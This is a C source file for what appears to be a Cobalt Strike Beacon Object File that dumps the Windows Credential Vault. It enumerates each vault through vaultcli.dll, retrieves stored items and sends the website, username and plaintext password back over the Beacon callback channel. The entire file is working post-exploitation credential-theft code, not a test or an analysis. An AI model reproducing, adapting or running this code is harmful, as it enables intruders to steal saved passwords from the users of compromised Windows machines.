#include "WindowsVault.h"

// TODO : Header file / common
// DateTime into String

PWSTR GetVaultType(PWSTR vaultType)
{

    if (MSVCRT$_wcsicmp(L"{2F1A6504-0641-44CF-8BB5-3612D865F2E5}", vaultType) == 0)
    {
        return L"Windows Secure Note";
    }
    else if (MSVCRT$_wcsicmp(L"3CCD5499-87A8-4B10-A215-608888DD3B55", vaultType) == 0)
    {
        return L"Windows Web Password Credential";
    }
    else if (MSVCRT$_wcsicmp(L"154E23D0-C644-4E6F-8CE6-5069272F999F", vaultType) == 0)
    {
        return L"Windows Credential Picker Protector";
    }
    else if (MSVCRT$_wcsicmp(L"{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}", vaultType) == 0)
    {
        return L"Web Credentials";
    }
    else if (MSVCRT$_wcsicmp(L"{77BC582B-F0A6-4E15-4E80-61736B6F3B29}", vaultType) == 0)
    {
        return L"Windows Credentials";
    }
    else if (MSVCRT$_wcsicmp(L"E69D7838-91B5-4FC9-89D5-230D4D4CC2BC", vaultType) == 0)
    {
        return L"Windows Domain Certificate Credential";
    }

    else if (MSVCRT$_wcsicmp(L"3E0E35BE-1B77-43E7-B873-AED901B6275B", vaultType) == 0)
    {
        return L"Windows Domain Password Credential";
    }

    else if (MSVCRT$_wcsicmp(L"3C886FF3-2669-4AA2-A8FB-3F6759A77548", vaultType) == 0)
    {
        return L"Windows Extended Credential";
    }

    return L"<blank>";
}

// Alternative using sprintf ? and the release into the formatp object
void displayFileTime(PFILETIME pFileTime, formatp *obj)
{
    SYSTEMTIME systemTime;
    LPWSTR Date = NULL;
    int size = 0;

    if (KERNEL32$FileTimeToSystemTime(pFileTime, &systemTime))
    {
        size = KERNEL32$GetDateFormatW(LOCALE_USER_DEFAULT, 0, &systemTime, NULL, Date, 0);
        size = size + KERNEL32$GetTimeFormatW(LOCALE_USER_DEFAULT, 0, &systemTime, NULL, Date, 0);

        Date = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, size);

        if (KERNEL32$GetDateFormatW(LOCALE_USER_DEFAULT, 0, &systemTime, NULL, Date, size))
        {
            BeaconFormatPrintf(obj, "\tLastWritten : %ls", Date);

            if (KERNEL32$GetTimeFormatW(LOCALE_USER_DEFAULT, 0, &systemTime, NULL, Date, size))
            {
                BeaconFormatPrintf(obj, " %ls\n", Date);
            }
        }
    }
}

PWSTR displayGUID(LPCGUID pGuid)
{
    _RtlStringFromGUID RtlStringFromGUID = NULL;
    _RtlFreeUnicodeString RtlFreeUnicodeString = NULL;

    RtlStringFromGUID = (_RtlStringFromGUID)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlStringFromGUID");
    if (RtlStringFromGUID == NULL)
    {
        return NULL;
    }

    RtlFreeUnicodeString = (_RtlFreeUnicodeString)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlFreeUnicodeString");
    if (RtlFreeUnicodeString == NULL)
    {
        return NULL;
    }

    UNICODE_STRING uString;
    PWSTR guidString;

    if (RtlStringFromGUID(pGuid, &uString) == STATUS_SUCCESS)
    {
        guidString = uString.Buffer;
        RtlFreeUnicodeString(&uString);

        return guidString;
    }

    return NULL;
}

VOID go(IN PCHAR Args, IN ULONG Length)
{

    _VaultEnumerateVaults VaultEnumerateVaults = NULL;
    _VaultOpenVault VaultOpenVault = NULL;
    _VaultEnumerateItems VaultEnumerateItems = NULL;
    _VaultGetItem8 VaultGetItem8 = NULL;
    _VaultGetItem7 VaultGetItem7 = NULL;
    _VaultCloseVault VaultCloseVault = NULL;
    _VaultFree VaultFree = NULL;
    HMODULE hVaultCli = NULL;

    BeaconPrintf(CALLBACK_OUTPUT, "===== WindowsVault =====\n");

    hVaultCli = LoadLibrary("vaultcli.dll");

    if (hVaultCli == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failure when loading library vaultcli.dll");
        return;
    }

    VaultEnumerateVaults = (_VaultEnumerateVaults)GetProcAddress(hVaultCli, "VaultEnumerateVaults");
    VaultOpenVault = (_VaultOpenVault)GetProcAddress(hVaultCli, "VaultOpenVault");
    VaultEnumerateItems = (_VaultEnumerateItems)GetProcAddress(hVaultCli, "VaultEnumerateItems");
    VaultCloseVault = (_VaultCloseVault)GetProcAddress(hVaultCli, "VaultCloseVault");
    VaultFree = (_VaultFree)GetProcAddress(hVaultCli, "VaultFree");
    // VaultGetItem7 = (_VaultGetItem7)GetProcAddress(hVaultCli, "VaultGetItem");
    VaultGetItem8 = (_VaultGetItem8)GetProcAddress(hVaultCli, "VaultGetItem");

    if (VaultEnumerateItems == NULL || VaultEnumerateVaults == NULL || VaultFree == NULL || VaultOpenVault == NULL || VaultCloseVault == NULL || VaultGetItem8 == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failure with GetProcAddress()");
        FreeLibrary(hVaultCli);
        return;
    }

    DWORD vaults_counter, items_counter;
    LPGUID vaults;
    HANDLE hVault;
    PVOID items;
    PVAULT_ITEM_8 vault_items, pvault_items;

    formatp vaultHeader, vaultContent;
    int size;
    char *data;

    // Alloc here to avoid bug on free
    BeaconFormatAlloc(&vaultHeader, 500);
    BeaconFormatAlloc(&vaultContent, 900);

    //PVAULT_ITEM_7 vault_items, pvault7_items;

    //Have to check windows 7
    /*    if (!KERNEL32$IsWindows8OrGreater())
    {
        BeaconPrintf(CALLBACK_ERROR, "Still not implemented for Win7...\n");
        return;
    } */

    if (VaultEnumerateVaults(0, &vaults_counter, &vaults) == ERROR_SUCCESS)
    {
        for (int i = 0; i < (int)vaults_counter; i++)
        {
            PWSTR vaultGuid = displayGUID(&vaults[i]);
            BeaconFormatPrintf(&vaultHeader, "Vault GUID : %ls\n", vaultGuid);
            BeaconFormatPrintf(&vaultHeader, "Vault Type : %ls\n", GetVaultType(vaultGuid));
            data = BeaconFormatToString(&vaultHeader, &size);
            BeaconOutput(CALLBACK_OUTPUT, data, size);
            BeaconFormatReset(&vaultHeader);

            if (VaultOpenVault(&vaults[i], 0, &hVault) == ERROR_SUCCESS)
            {

                if (VaultEnumerateItems(hVault, 0x200, &items_counter, &items) == ERROR_SUCCESS)
                {
                    vault_items = (PVAULT_ITEM_8)items;

                    for (int j = 0; j < (int)items_counter; j++)
                    {

                        vaultGuid = displayGUID(&vaults[i]);
                        BeaconFormatPrintf(&vaultHeader, "\tSchemaId     : %ls\n", vaultGuid);
                        BeaconFormatPrintf(&vaultContent, "\tSource      : %ls\n", vault_items[j].FriendlyName);
                        BeaconFormatPrintf(&vaultContent, "\tWebsite     : %ls\n", vault_items[j].Resource->data.String);
                        BeaconFormatPrintf(&vaultContent, "\tUsername    : %ls\n", vault_items[j].Identity->data.String);

                        displayFileTime(&vault_items[j].LastWritten, &vaultContent);

                        pvault_items = NULL;

                        VaultGetItem8(hVault, &vault_items[j].SchemaId, vault_items[j].Resource, vault_items[j].Identity, vault_items[j].PackageSid, NULL, 0, &pvault_items);

                        if (pvault_items->Authenticator != NULL && pvault_items->Authenticator->data.String != NULL)
                        {
                            BeaconFormatPrintf(&vaultContent, "\tPassword    : %ls\n", pvault_items->Authenticator->data.String);
                        }

                        data = BeaconFormatToString(&vaultContent, &size);
                        BeaconOutput(CALLBACK_OUTPUT, data, size);
                        BeaconFormatReset(&vaultContent);

                        if (pvault_items)
                            VaultFree(pvault_items);
                    }
                }

                if (vault_items)
                    VaultFree(vault_items);
            }

            VaultCloseVault(&hVault);
        }
    }
    else
    {
        BeaconPrintf(CALLBACK_OUTPUT, "Found no vault to be enumerated\n");
        return;
    }

    if (vaults != NULL)
        VaultFree(vaults);

    if (hVaultCli != NULL)
        FreeLibrary(hVaultCli);

    BeaconFormatFree(&vaultHeader);
    BeaconFormatFree(&vaultContent);
}